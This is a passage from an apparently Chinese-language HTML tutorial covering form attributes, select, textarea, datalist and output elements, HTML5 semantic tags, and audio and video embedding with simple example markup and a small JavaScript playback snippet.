attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>以管理员身份提交<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><h4 id="formmethod"><a href="#formmethod" class="headerlink" title="formmethod"></a>formmethod</h4><p>定义用以向 action URL 发送表单数据（form-data）的 HTTP 方法。</p><p>formmethod 属性覆盖 <code>&lt;form&gt;</code> 元素的 method 属性。</p><p>适用于 type=”submit” 以及 type=”image”。</p><p>可以改变提交的方式。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   First name: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fname<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>   Last name: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>lname<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">formmethod</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">formaction</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span>   <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Submit using POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span> </code></pre><h4 id="formtarget"><a href="#formtarget" class="headerlink" title="formtarget"></a>formtarget</h4><p>规定的名称或关键词指示提交表单后在何处显示接收到的响应。</p><p>会覆盖 <code>&lt;form&gt;</code> 元素的 target 属性。可与 type=”submit” 和 type=”image” 使用。</p><p>比如指定某个按钮在新的页面打开。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>action_page.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   First name: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fname<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>   Last name: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>lname<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Submit as normal<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">formtarget</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span>   <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Submit to a new window<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span> </code></pre><h4 id="formenctype"><a href="#formenctype" class="headerlink" title="formenctype"></a>formenctype</h4><p>定当把表单数据（form-data）提交至服务器时如何对其进行编码（仅针对 method=”post” 的表单）。</p><p>覆盖 <code>&lt;form&gt;</code> 元素的 enctype 属性。</p><h4 id="formnovalidate"><a href="#formnovalidate" class="headerlink" title="formnovalidate"></a>formnovalidate</h4><p>布尔属性。如果设置，则规定在提交表单时不对 <code>&lt;input&gt;</code> 元素进行验证。</p><p>覆盖 <code>&lt;form&gt;</code> 元素的 novalidate 属性。可用于 type=”submit”。</p><hr><p>噗，终于看完 input 元素的属性了，真的多emmm</p><p>下面接着看其他的表单元素吧。</p><h3 id="select-元素-下拉列表"><a href="#select-元素-下拉列表" class="headerlink" title="select 元素 下拉列表"></a>select 元素 下拉列表</h3><p><code>&lt;select&gt;</code> 定义<strong>下拉列表</strong>，<code>&lt;option&gt;</code> 元素定义<strong>待选择的选项</strong>。</p><p>列表通常会把首个选项显示为被选选项。</p><p>可以通过添加 <code>selected</code> 属性来定义预定义选项。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>cars<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>volvo<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Volvo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>saab<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Saab<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fiat<span class="token punctuation">"</span></span> <span class="token attr-name">selected</span><span class="token punctuation">></span></span>Fiat<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>audi<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Audi<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span></code></pre><select name="cars"><option value="volvo">Volvo</option><option value="saab">Saab</option><option value="fiat" selected="">Fiat</option><option value="audi">Audi</option></select><br><h3 id="textarea-元素-文本域"><a href="#textarea-元素-文本域" class="headerlink" title="textarea 元素 文本域"></a>textarea 元素 文本域</h3><p>定义多行输入字段（<em>文本域</em>）。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>message<span class="token punctuation">"</span></span> <span class="token attr-name">rows</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span> <span class="token attr-name">cols</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>30<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>The cat was playing in the garden.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">></span></span></code></pre><textarea name="message" rows="10" cols="30">The cat was playing in the garden.</textarea><br><p>上面这里指定了默认情况下一行30个字符，一列10个字符。注意一行里一个汉字算作2个字符哒。</p><h3 id="button-元素-按钮"><a href="#button-元素-按钮" class="headerlink" title="button 元素 按钮"></a>button 元素 按钮</h3><p>定义可点击的<em>按钮</em>。具体再指定相应的动作。</p><p>这个和 <code>&lt;input type="button"&gt;</code> 效果类似。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>alert(<span class="token punctuation">'</span>Hello World!<span class="token punctuation">'</span>)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Click Me!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span></code></pre><p><button type="button" onclick="alert('Hello World!')">Click Me!</button><br><br></p><hr><p>下面是 HTML5 新增的元素</p><p><code>&lt;datalist&gt;</code>  <code>&lt;keygen&gt;</code>  <code>&lt;output&gt;</code></p><table><thead><tr><th>标签</th><th>描述</th></tr></thead><tbody><tr><td><code>&lt;datalist&gt;</code></td><td>定义输入控件的预定义选项。</td></tr><tr><td><code>&lt;keygen&gt;</code></td><td>定义键对生成器字段（用于表单）。</td></tr><tr><td><code>&lt;output&gt;</code></td><td>定义计算结果。</td></tr></tbody></table><h3 id="datalist-元素-预定义选项列表"><a href="#datalist-元素-预定义选项列表" class="headerlink" title="datalist 元素 预定义选项列表"></a>datalist 元素 预定义选项列表</h3><p>规定预定义选项列表。</p><p>用户会在他们输入数据时看到预定义选项的下拉列表。</p><p><code>&lt;input&gt;</code> 元素的 <em>list</em> 属性必须引用 <code>&lt;datalist&gt;</code> 元素的 <em>id</em> 属性。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">list</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>browsers<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>datalist</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>browsers<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Internet Explorer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Firefox<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Chrome<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Opera<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Safari<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>datalist</span><span class="token punctuation">></span></span> </code></pre><input list="browsers"><datalist id="browsers">   <option value="Internet Explorer">   </option><option value="Firefox">   </option><option value="Chrome">   </option><option value="Opera">   </option><option value="Safari"></option></datalist> <p>上面的input元素的属性里也提到了。</p><br><h3 id="output-元素"><a href="#output-元素" class="headerlink" title="output 元素"></a>output 元素</h3><p>作为计算结果输出显示(比如执行脚本的输出)。</p><table><thead><tr><th>属性</th><th>值</th><th>描述</th></tr></thead><tbody><tr><td>for</td><td><em>element_id</em></td><td>描述计算中使用的元素与计算结果之间的关系。</td></tr><tr><td>form</td><td><em>form_id</em></td><td>定义输入字段所属的一个或多个表单。</td></tr><tr><td>name</td><td><em>name</em></td><td>定义对象的唯一名称（表单提交时使用）。</td></tr></tbody></table><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">oninput</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>x.value<span class="token punctuation">=</span>parseInt(a.value)+parseInt(b.value)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>range<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>100+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>number<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>b<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>output</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>x<span class="token punctuation">"</span></span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a b<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>output</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><form oninput="x.value=parseInt(a.value)+parseInt(b.value)">0<input type="range" id="a" value="50">100+<input type="number" id="b" value="50">=<output name="x" for="a b"></output></form><br><hr><br><h2 id="H5-中的语义元素"><a href="#H5-中的语义元素" class="headerlink" title="H5 中的语义元素"></a>H5 中的语义元素</h2><table><thead><tr><th>标签</th><th>描述</th></tr></thead><tbody><tr><td><code>&lt;article&gt;</code></td><td>定义文章。</td></tr><tr><td><code>&lt;aside&gt;</code></td><td>定义页面内容以外的内容。</td></tr><tr><td><code>&lt;details&gt;</code></td><td>定义用户能够查看或隐藏的额外细节。</td></tr><tr><td><code>&lt;figcaption&gt;</code></td><td>定义 <code>&lt;figure&gt;</code> 元素的标题。</td></tr><tr><td><code>&lt;figure&gt;</code></td><td>规定自包含内容，比如图示、图表、照片、代码清单等。</td></tr><tr><td><code>&lt;footer&gt;</code></td><td>定义文档或节的页脚。</td></tr><tr><td><code>&lt;header&gt;</code></td><td>规定文档或节的页眉。</td></tr><tr><td><code>&lt;main&gt;</code></td><td>规定文档的主内容。</td></tr><tr><td><code>&lt;mark&gt;</code></td><td>定义重要的或强调的文本。</td></tr><tr><td><code>&lt;nav&gt;</code></td><td>定义导航链接。</td></tr><tr><td><code>&lt;section&gt;</code></td><td>定义文档中的节。</td></tr><tr><td><code>&lt;summary&gt;</code></td><td>定义 <code>&lt;details&gt;</code> 元素的可见标题。</td></tr><tr><td><code>&lt;time&gt;</code></td><td>定义日期/时间。</td></tr></tbody></table><h2 id="多媒体"><a href="#多媒体" class="headerlink" title="多媒体"></a>多媒体</h2><p>Web 上的多媒体指的是音效、音乐、视频和动画等。</p><h3 id="object-元素"><a href="#object-元素" class="headerlink" title="object 元素"></a>object 元素</h3><p><code>&lt;object&gt;</code> 的作用是支持 HTML 助手（插件）。</p><p>辅助应用程序（helper application）是可由浏览器启动的程序，也称为插件。</p><p>辅助程序可用于播放音频和视频（以及其他）。辅助程序是使用 <code>&lt;object&gt;</code> 标签来加载的。</p><h3 id="音频"><a href="#音频" class="headerlink" title="音频"></a>音频</h3><p>有这几种方案：</p><p>可以使用插件、使用<code>&lt;embed&gt;</code>元素、使用 <code>&lt;object&gt;</code> 元素、使用 HTML5 <code>&lt;audio&gt;</code> 元素等。</p><h4 id="使用-lt-embed-gt-元素"><a href="#使用-lt-embed-gt-元素" class="headerlink" title="使用<embed>元素"></a>使用<code>&lt;embed&gt;</code>元素</h4><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>embed</span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>song.mp3<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code></pre><h4 id="使用-lt-object-gt-元素"><a href="#使用-lt-object-gt-元素" class="headerlink" title="使用 <object> 元素"></a>使用 <code>&lt;object&gt;</code> 元素</h4><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>object</span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span> <span class="token attr-name">data</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>song.mp3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>object</span><span class="token punctuation">></span></span></code></pre><h4 id="使用-HTML5-lt-audio-gt-元素"><a href="#使用-HTML5-lt-audio-gt-元素" class="headerlink" title="使用 HTML5 <audio> 元素"></a>使用 HTML5 <code>&lt;audio&gt;</code> 元素</h4><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>audio</span> <span class="token attr-name">controls</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>controls<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>song.mp3<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>audio/mp3<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>song.ogg<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>audio/ogg<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>Your browser does not support this audio format.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>audio</span><span class="token punctuation">></span></span></code></pre><p>这里定义了一个备选文件源，当<code>.mp3</code> 失效或浏览器不支持时，可以调用 <code>.ogg</code> 的文件。浏览器将使用第一个可识别的格式。</p><p>若浏览器不支持<code>audio</code>元素的话，则会显示 <code>Your browser does not support this audio format.</code></p><p><code>audio</code>元素有如下的属性：</p><table><thead><tr><th>属性</th><th>值</th><th>描述</th></tr></thead><tbody><tr><td>autoplay</td><td>autoplay</td><td>如果出现该属性，则音频在就绪后马上播放。</td></tr><tr><td>controls</td><td>controls</td><td>如果出现该属性，则向用户显示控件，比如播放按钮。</td></tr><tr><td>loop</td><td>loop</td><td>如果出现该属性，则每当音频结束时重新开始播放。</td></tr><tr><td>preload</td><td>preload</td><td>如果出现该属性，则音频在页面加载时进行加载，并预备播放。如果使用 “autoplay”，则忽略该属性。</td></tr><tr><td>src</td><td><em>url</em></td><td>要播放的音频的 URL。</td></tr></tbody></table><h4 id="更好的方案"><a href="#更好的方案" class="headerlink" title="更好的方案"></a>更好的方案</h4><p><code>&lt;audio&gt;</code> 元素会尝试以 mp3 或 ogg 来播放音频。如果失败，代码将回退尝试 <code>&lt;embed&gt;</code> 元素。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>audio</span> <span class="token attr-name">controls</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>controls<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>song.mp3<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>audio/mp3<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>song.ogg<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>audio/ogg<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>embed</span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>song.mp3<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>audio</span><span class="token punctuation">></span></span></code></pre><h4 id="使用超链接"><a href="#使用超链接" class="headerlink" title="使用超链接"></a>使用超链接</h4><p>实在不行，就直接用 <code>a</code> 链接标签吧。</p><p>点击该链接，浏览器会启动“辅助应用程序”来播放该文件。也可能会弹出文件下载界面。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>song.mp3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Play the sound<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></code></pre><hr><h3 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h3><p>和音频类似，也可以用<code>&lt;embed&gt;</code>元素、<code>&lt;object&gt;</code> 元素、HTML5 <code>&lt;video&gt;</code> 元素、超链接等。</p><p>只是把相应的源（src、data、href等）修改为视频地址即可。</p><h4 id="使用-lt-video-gt-标签"><a href="#使用-lt-video-gt-标签" class="headerlink" title="使用 <video> 标签"></a>使用 <code>&lt;video&gt;</code> 标签</h4><p>显示一段嵌入网页的 ogg、mp4 或 webm 格式的视频。</p><p>它有以下属性：</p><table><thead><tr><th>属性</th><th>值</th><th>描述</th></tr></thead><tbody><tr><td>autoplay</td><td>autoplay</td><td>如果出现该属性，则视频在就绪后马上播放。</td></tr><tr><td>controls</td><td>controls</td><td>如果出现该属性，则向用户显示控件，比如播放按钮。</td></tr><tr><td>height</td><td><em>pixels</em></td><td>设置视频播放器的高度。</td></tr><tr><td>loop</td><td>loop</td><td>如果出现该属性，则当媒介文件完成播放后再次开始播放。</td></tr><tr><td>preload</td><td>preload</td><td>如果出现该属性，则视频在页面加载时进行加载，并预备播放。如果使用 “autoplay”，则忽略该属性。</td></tr><tr><td>src</td><td><em>url</em></td><td>要播放的视频的 URL。</td></tr><tr><td>width</td><td><em>pixels</em></td><td>设置视频播放器的宽度。</td></tr></tbody></table><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>video</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>320<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>240<span class="token punctuation">"</span></span> <span class="token attr-name">controls</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>controls<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>movie.mp4<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>video/mp4<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>movie.ogg<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>video/ogg<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>movie.webm<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>video/webm<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>Your browser does not support the video tag.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>video</span><span class="token punctuation">></span></span></code></pre><p>可以使用 DOM 进行控制视频的播放、暂停以及加载等。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token keyword">var</span> myVideo<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"video1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">playPause</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>myVideo<span class="token punctuation">.</span>paused<span class="token punctuation">)</span>             myVideo<span class="token punctuation">.</span><span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">else</span>             myVideo<span class="token punctuation">.</span><span class="token function">pause</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">function</span> <span class="token function">makeBig</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>         myVideo<span class="token punctuation">.</span>width<span class="token operator">=</span><span class="token number">560</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">function</span> <span class="token function">makeSmall</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>         myVideo<span class="token punctuation">.</span>width<span class="token 